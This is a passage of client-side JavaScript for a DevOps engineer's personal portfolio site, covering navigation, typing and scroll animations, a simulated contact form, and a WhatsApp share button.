    particle.style.left = Math.random() * 100 + '%';
    particle.style.animationDelay = Math.random() * 20 + 's';
    particle.style.animationDuration = (15 + Math.random() * 10) + 's';
    particlesContainer.appendChild(particle);
  }
}

createParticles();

// Mobile Navigation Toggle
const hamburger = document.getElementById('hamburger');
const navMenu = document.querySelector('.nav-menu');
const navLinks = document.querySelectorAll('.nav-link');

hamburger?.addEventListener('click', () => {
  navMenu.classList.toggle('active');
  hamburger.classList.toggle('active');
});

navLinks.forEach(link => {
  link.addEventListener('click', () => {
    navMenu.classList.remove('active');
    hamburger.classList.remove('active');
  });
});

// Active Navigation Link on Scroll
function updateActiveNavLink() {
  const sections = document.querySelectorAll('section[id]');
  const scrollY = window.pageYOffset;

  sections.forEach(section => {
    const sectionHeight = section.offsetHeight;
    const sectionTop = section.offsetTop - 100;
    const sectionId = section.getAttribute('id');
    const navLink = document.querySelector(`.nav-link[href="#${sectionId}"]`);

    if (scrollY > sectionTop && scrollY <= sectionTop + sectionHeight) {
      navLinks.forEach(link => link.classList.remove('active'));
      navLink?.classList.add('active');
    }
  });
}

window.addEventListener('scroll', updateActiveNavLink);

// Terminal Typing Effect
function typeTerminalText() {
  const terminalLines = [
    { text: 'whoami', output: 'Siseko Makomazi - DevOps Engineer' },
    { text: 'cat skills.txt', output: 'Kubernetes • Docker • Terraform • CI/CD • AWS • Azure' }
  ];
  
  let lineIndex = 0;
  let charIndex = 0;
  let isTyping = false;

  function typeLine() {
    if (lineIndex >= terminalLines.length) {
      setTimeout(typeLine, 3000);
      lineIndex = 0;
      return;
    }

    const currentLine = terminalLines[lineIndex];
    const terminalLine = document.querySelectorAll('.terminal-line')[lineIndex];
    const terminalOutput = document.querySelectorAll('.terminal-output')[lineIndex];
    
    if (!isTyping && terminalLine) {
      isTyping = true;
      const prompt = terminalLine.querySelector('.prompt');
      const textSpan = document.createElement('span');
      textSpan.className = 'terminal-text';
      terminalLine.appendChild(textSpan);
      
      function typeChar() {
        if (charIndex < currentLine.text.length) {
          textSpan.textContent += currentLine.text[charIndex];
          charIndex++;
          setTimeout(typeChar, 50);
        } else {
          isTyping = false;
          charIndex = 0;
          lineIndex++;
          
          if (terminalOutput) {
            setTimeout(() => {
              terminalOutput.style.opacity = '1';
            }, 500);
          }
          
          setTimeout(typeLine, 2000);
        }
      }
      
      typeChar();
    }
  }

  typeLine();
}

// Start terminal typing after page load
setTimeout(typeTerminalText, 2000);

// Hero Typing Animation
function typeHeroText() {
  const phrases = [
    'DevOps Automation',
    'Cloud Infrastructure',
    'Container Orchestration',
    'CI/CD Pipelines',
    'Full Stack Development'
  ];
  
  let phraseIndex = 0;
  let charIndex = 0;
  let isDeleting = false;
  const typedTextElement = document.querySelector('.typed-text');
  
  if (!typedTextElement) return;

  function type() {
    const currentPhrase = phrases[phraseIndex];
    
    if (!isDeleting) {
      typedTextElement.textContent = currentPhrase.substring(0, charIndex + 1);
      charIndex++;
      
      if (charIndex === currentPhrase.length) {
        isDeleting = true;
        setTimeout(type, 2000);
        return;
      }
    } else {
      typedTextElement.textContent = currentPhrase.substring(0, charIndex - 1);
      charIndex--;
      
      if (charIndex === 0) {
        isDeleting = false;
        phraseIndex = (phraseIndex + 1) % phrases.length;
      }
    }
    
    setTimeout(type, isDeleting ? 50 : 100);
  }

  type();
}

typeHeroText();

// Skill Progress Bars Animation
function animateSkillBars() {
  const progressBars = document.querySelectorAll('.progress-fill');
  
  progressBars.forEach(bar => {
    const width = bar.style.width;
    bar.style.width = '0%';
    
    setTimeout(() => {
      bar.style.width = width;
    }, 200);
  });
}

// Trigger skill animation when skills section is in view
const skillsSection = document.getElementById('skills');
const skillsObserver = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      animateSkillBars();
      skillsObserver.unobserve(entry.target);
    }
  });
}, { threshold: 0.5 });

if (skillsSection) {
  skillsObserver.observe(skillsSection);
}

// Contact Form Handling
const contactForm = document.getElementById('contactForm');
const formMessage = document.getElementById('formMessage');

if (contactForm) {
  contactForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const formData = new FormData(contactForm);
    const data = Object.fromEntries(formData);
    
    // Show loading state
    const submitBtn = contactForm.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
    submitBtn.disabled = true;
    
    try {
      // Simulate form submission (replace with actual endpoint)
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show success message
      formMessage.className = 'form-message success';
      formMessage.textContent = 'Message sent successfully! I\'ll get back to you soon.';
      formMessage.style.display = 'block';
      
      // Reset form
      contactForm.reset();
    } catch (error) {
      // Show error message
      formMessage.className = 'form-message error';
      formMessage.textContent = 'Oops! Something went wrong. Please try again.';
      formMessage.style.display = 'block';
    } finally {
      // Reset button
      submitBtn.innerHTML = originalText;
      submitBtn.disabled = false;
      
      // Hide message after 5 seconds
      setTimeout(() => {
        formMessage.style.display = 'none';
      }, 5000);
    }
  });
}

// Navbar Background on Scroll
function updateNavbarBackground() {
  const navbar = document.querySelector('.navbar');
  if (window.scrollY > 50) {
    navbar.style.background = 'rgba(10, 10, 10, 0.98)';
    navbar.style.boxShadow = '0 4px 20px rgba(0, 0, 0, 0.3)';
  } else {
    navbar.style.background = 'rgba(10, 10, 10, 0.95)';
    navbar.style.boxShadow = 'none';
  }
}

window.addEventListener('scroll', updateNavbarBackground);

// Smooth Scroll for Navigation Links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
  anchor.addEventListener('click', function (e) {
    e.preventDefault();
    const target = document.querySelector(this.getAttribute('href'));
    if (target) {
      target.scrollIntoView({
        behavior: 'smooth',
        block: 'start'
      });
    }
  });
});

// Project Card Hover Effects
const projectCards = document.querySelectorAll('.project-card');
projectCards.forEach(card => {
  card.addEventListener('mouseenter', () => {
    card.style.transform = 'translateY(-10px) scale(1.02)';
  });
  
  card.addEventListener('mouseleave', () => {
    card.style.transform = 'translateY(0) scale(1)';
  });
});

// Timeline Animation on Scroll
const timelineItems = document.querySelectorAll('.timeline-item');
const timelineObserver = new IntersectionObserver((entries) => {
  entries.forEach((entry, index) => {
    if (entry.isIntersecting) {
      setTimeout(() => {
        entry.target.style.opacity = '1';
        entry.target.style.transform = 'translateY(0)';
      }, index * 200);
      timelineObserver.unobserve(entry.target);
    }
  });
}, { threshold: 0.1 });

timelineItems.forEach(item => {
  item.style.opacity = '0';
  item.style.transform = 'translateY(50px)';
  item.style.transition = 'all 0.6s ease';
  timelineObserver.observe(item);
});

// Parallax Effect for Hero Section
function updateParallax() {
  const hero = document.querySelector('.hero');
  if (hero) {
    const scrolled = window.pageYOffset;
    const parallaxElements = hero.querySelectorAll('.hero-text, .hero-visual');
    
    parallaxElements.forEach((element, index) => {
      const speed = index === 0 ? 0.5 : 0.3;
      element.style.transform = `translateY(${scrolled * speed}px)`;
    });
  }
}

window.addEventListener('scroll', updateParallax);

// Cursor Glow Effect (Optional - for desktop)
function createCursorGlow() {
  if (window.innerWidth > 768) {
    const cursor = document.createElement('div');
    cursor.className = 'cursor-glow';
    cursor.style.cssText = `
      position: fixed;
      width: 20px;
      height: 20px;
      background: radial-gradient(circle, rgba(0, 212, 255, 0.3) 0%, transparent 70%);
      border-radius: 50%;
      pointer-events: none;
      z-index: 9998;
      transition: transform 0.1s ease;
      transform: translate(-50%, -50%);
    `;
    document.body.appendChild(cursor);
    
    document.addEventListener('mousemove', (e) => {
      cursor.style.left = e.clientX + 'px';
      cursor.style.top = e.clientY + 'px';
    });
    
    document.addEventListener('mousedown', () => {
      cursor.style.transform = 'translate(-50%, -50%) scale(0.8)';
    });
    
    document.addEventListener('mouseup', () => {
      cursor.style.transform = 'translate(-50%, -50%) scale(1)';
    });
  }
}

// Initialize cursor glow on desktop
createCursorGlow();

// Performance Optimization - Debounce scroll events
function debounce(func, wait) {
  let timeout;
  return function executedFunction(...args) {
    const later = () => {
      clearTimeout(timeout);
      func(...args);
    };
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
  };
}

// Apply debouncing to scroll events
window.addEventListener('scroll', debounce(updateActiveNavLink, 10));
window.addEventListener('scroll', debounce(updateNavbarBackground, 10));
window.addEventListener('scroll', debounce(updateParallax, 10));

// Add CSS for cursor glow
const cursorStyles = document.createElement('style');
cursorStyles.textContent = `
  .cursor-glow {
    mix-blend-mode: screen;
  }
`;
document.head.appendChild(cursorStyles);

// Auto-adjust viewport for each section
function adjustViewportForSection(sectionId) {
  const section = document.getElementById(sectionId);
  if (!section) return;
  
  // Get section dimensions
  const sectionHeight = section.offsetHeight;
  const viewportHeight = window.innerHeight;
  
  // Calculate optimal padding and spacing for this section
  const sectionType = sectionId.replace('#', '');
  let optimalPadding = 80; // Default
  
  switch(sectionType) {
    case 'home':
      optimalPadding = Math.max(120, viewportHeight * 0.1);
      break;
    case 'about':
    case 'skills':
    case 'experience':
    case 'certificates':
      optimalPadding = Math.max(80, viewportHeight * 0.08);
      break;
    case 'projects':
      optimalPadding = Math.max(100, viewportHeight * 0.09);
      break;
    case 'contact':
      optimalPadding = Math.max(120, viewportHeight * 0.1);
      break;
  }
  
  // Apply dynamic padding based on content
  const sectionContent = section.querySelector('.container, .section-header');
  if (sectionContent) {
    const contentHeight = sectionContent.offsetHeight;
    if (contentHeight > viewportHeight * 0.8) {
      // For long content, ensure full visibility
      section.style.minHeight = 'auto';
      section.style.paddingTop = `${optimalPadding}px`;
      section.style.paddingBottom = `${optimalPadding}px`;
    } else {
      // For shorter content, center it nicely
      section.style.minHeight = `${viewportHeight}px`;
      section.style.paddingTop = `${optimalPadding}px`;
      section.style.paddingBottom = `${optimalPadding}px`;
    }
  }
}

// Enhanced smooth scroll with viewport adjustment
function smoothScrollToSection(sectionId) {
  const section = document.getElementById(sectionId);
  if (!section) return;
  
  // Adjust viewport for this section first
  adjustViewportForSection(sectionId);
  
  // Small delay to allow layout adjustment
  setTimeout(() => {
    const sectionTop = section.offsetTop - 80; // Account for fixed navbar
    
    window.scrollTo({
      top: sectionTop,
      behavior: 'smooth'
    });
    
    // Update active nav link
    updateActiveNavLink();
  }, 100);
}

// Auto-adjust all visible sections on load
function autoAdjustAllSections() {
  const sections = document.querySelectorAll('section[id]');
  sections.forEach(section => {
    adjustViewportForSection(section.id);
  });
}

// Auto-adjust on window resize with debouncing
let resizeTimeout;
function handleResize() {
  clearTimeout(resizeTimeout);
  resizeTimeout = setTimeout(() => {
    autoAdjustAllSections();
  }, 250);
}

// Active Navigation Link on Scroll (Enhanced with auto-adjustment)
function updateActiveNavLink() {
  const sections = document.querySelectorAll('section[id]');
  const scrollY = window.pageYOffset;

  sections.forEach(section => {
    const sectionHeight = section.offsetHeight;
    const sectionTop = section.offsetTop - 100;
    const sectionId = section.getAttribute('id');
    const navLink = document.querySelector(`.nav-link[href="#${sectionId}"]`);

    if (scrollY > sectionTop && scrollY <= sectionTop + sectionHeight) {
      navLinks.forEach(link => link.classList.remove('active'));
      navLink?.classList.add('active');
      
      // Auto-adjust viewport for the current section
      adjustViewportForSection(sectionId);
    }
  });
}

// Replace existing navigation event listeners
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
  anchor.addEventListener('click', function (e) {
    e.preventDefault();
    const targetId = this.getAttribute('href').substring(1);
    smoothScrollToSection(targetId);
  });
});

// Initialize auto-adjustment system
window.addEventListener('load', () => {
  autoAdjustAllSections();
  
  // Re-adjust after loading animations complete
  setTimeout(autoAdjustAllSections, 2000);
});

window.addEventListener('resize', handleResize);

// Debounced scroll handler for performance
let scrollTimeout;
window.addEventListener('scroll', () => {
  clearTimeout(scrollTimeout);
  scrollTimeout = setTimeout(() => {
    updateActiveNavLink();
  }, 100);
});

// Auto-adjust when navigating via browser back/forward
window.addEventListener('popstate', () => {
  setTimeout(autoAdjustAllSections, 100);
});

// Dynamic viewport height adjustment for mobile devices
function handleMobileViewport() {
  const isMobile = window.innerWidth <= 768;
  if (isMobile) {
    // Adjust for mobile viewport issues
    const vh = window.innerHeight * 0.01;
    document.documentElement.style.setProperty('--vh', `${vh}px`);
    
    // Re-adjust sections for mobile
    autoAdjustAllSections();
  }
}

// Initialize mobile viewport handling
handleMobileViewport();
window.addEventListener('orientationchange', () => {
  setTimeout(handleMobileViewport, 100);
});

// WhatsApp Status Sharing Helper
function shareToWhatsAppStatus() {
  const url = encodeURIComponent(window.location.href);
  const title = encodeURIComponent("Siseko Makomazi - DevOps Engineer & Full Stack Developer");
  const description = encodeURIComponent("Check out my portfolio! Junior DevOps Engineer specializing in cloud technologies, CI/CD, and automation.");
  
  // WhatsApp status sharing format
  const whatsappUrl = `https://wa.me/?text=${title}%0A${description}%0A${url}`;
  
  // Open WhatsApp
  window.open(whatsappUrl, '_blank');
}

// Add WhatsApp share button to contact section
function addWhatsAppShareButton() {
  const contactSection = document.querySelector('.contact-content');
  if (contactSection) {
    const whatsappShare = document.createElement('div');
    whatsappShare.className = 'whatsapp-share';
    whatsappShare.innerHTML = `
      <button onclick="shareToWhatsAppStatus()" class="btn btn-whatsapp">
        <i class="fab fa-whatsapp"></i>
        Share on WhatsApp Status
      </button>
    `;
    contactSection.appendChild(whatsappShare);
  }
}

// WhatsApp preview optimization
function optimizeWhatsAppPreview() {
  // Ensure image is properly sized for WhatsApp
  const img = new Image();
  img.crossOrigin = 'anonymous';
  img.onload = function() {
    console.log('✅ WhatsApp image loaded successfully');
    console.log('� Image dimensions:', img.width, 'x', img.height);
  };
  img.onerror = function() {
    console.warn('⚠️ WhatsApp image failed to load');
  };
  img.src = 'https://slmakomazi.github.io/MyOfficialPortfolio/professionalImage.jpeg';
}

// Initialize WhatsApp optimizations
document.addEventListener('DOMContentLoaded', function() {
  setTimeout(() => {
    addWhatsAppShareButton();
    optimizeWhatsAppPreview();
  }, 1000);
});

console.log('�🚀 Auto-adjustment system initialized');
console.log('📱 Dynamic viewport handling enabled');
console.log('🎯 Section-based optimization active');
console.log('📱 WhatsApp sharing optimized');
